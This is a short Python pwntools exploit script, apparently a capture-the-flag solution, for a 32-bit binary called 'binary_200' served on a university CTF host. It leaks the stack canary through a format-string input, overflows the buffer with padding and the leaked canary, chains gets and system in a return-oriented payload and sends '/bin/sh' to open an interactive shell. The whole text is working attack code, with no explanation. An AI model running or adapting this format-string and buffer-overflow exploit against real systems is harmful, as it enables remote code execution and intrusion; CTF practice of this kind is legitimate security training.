from pwn import *

context.log_level = 'debug'

elf = ELF('binary_200')

main = 0x08048561
system = elf.symbols['system']
gets = elf.symbols['gets']
buf = elf.bss() + 200

rop = [
	gets,
	system,
	buf,
	buf
]

#io = process('binary_200')
io = remote('bamboofox.cs.nctu.edu.tw', 22002)

io.sendline('%15$x')
canary = int(io.recv(8), 16)
io.sendline('a'*40 + p32(canary) +'a'*12 + flat(rop))
io.sendline('/bin/sh\x00')
io.interactive()
